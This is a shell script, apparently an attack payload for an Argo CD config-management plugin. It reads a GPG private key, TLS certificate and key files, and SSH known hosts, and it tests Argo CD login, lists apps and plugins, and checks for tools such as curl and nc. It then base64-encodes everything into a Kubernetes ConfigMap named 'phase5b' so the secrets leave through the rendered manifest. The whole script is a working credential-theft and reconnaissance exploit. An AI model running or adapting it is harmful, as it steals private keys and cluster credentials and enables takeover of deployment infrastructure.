#!/bin/sh
RECON=$( (
  echo "===GPG_KEY==="
  cat /app/config/gpg/keys/private-keys-v1.d/E304B7A132D78E19C543A2E8EDEA6AA247E7D384.key 2>/dev/null | base64 | tr -d '\n'
  echo ""
  echo "===SSH_KNOWN_HOSTS==="
  cat /app/config/ssh/ssh_known_hosts 2>/dev/null
  echo ""
  echo "===TLS_DIR==="
  ls -la /app/config/tls/ 2>/dev/null
  echo ""
  echo "===REPOSERVER_TLS==="
  ls -la /app/config/reposerver/tls/ 2>/dev/null
  echo ""
  echo "===TLS_CERTS==="
  for f in /app/config/tls/* /app/config/reposerver/tls/*; do
    echo "--- $f ---"
    cat "$f" 2>/dev/null | base64 | tr -d '\n'
    echo ""
  done
  echo ""
  echo "===ARGOCD_CLI==="
  file /usr/local/bin/argocd 2>/dev/null
  /usr/local/bin/argocd version 2>/dev/null
  echo ""
  echo "===ARGOCD_LOGIN_TEST==="
  /usr/local/bin/argocd login argocd-server.argocd.svc.cluster.local --insecure --grpc-web 2>/dev/null || echo "login failed"
  echo ""
  echo "===ARGOCD_APP_LIST==="
  /usr/local/bin/argocd app list --server argocd-server.argocd.svc.cluster.local --insecure --grpc-web 2>/dev/null | head -50
  echo ""
  echo "===CMP_PLUGINS==="
  ls -laR /home/argocd/cmp-server/plugins/ 2>/dev/null
  echo ""
  echo "===CMP_CONFIG==="
  find /home/argocd/cmp-server -type f 2>/dev/null
  cat /home/argocd/cmp-server/plugins/plugin.yaml 2>/dev/null
  echo ""
  echo "===BINARIES==="
  which wget curl nc bash python python3 perl ruby node npm 2>/dev/null
  echo ""
  echo "===REPO_CONFIG==="
  ls -la /app/config/ 2>/dev/null
  ls -laR /app/config/gpg/ 2>/dev/null
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: phase5b
data:
  result: $RECON
EOF
exit 0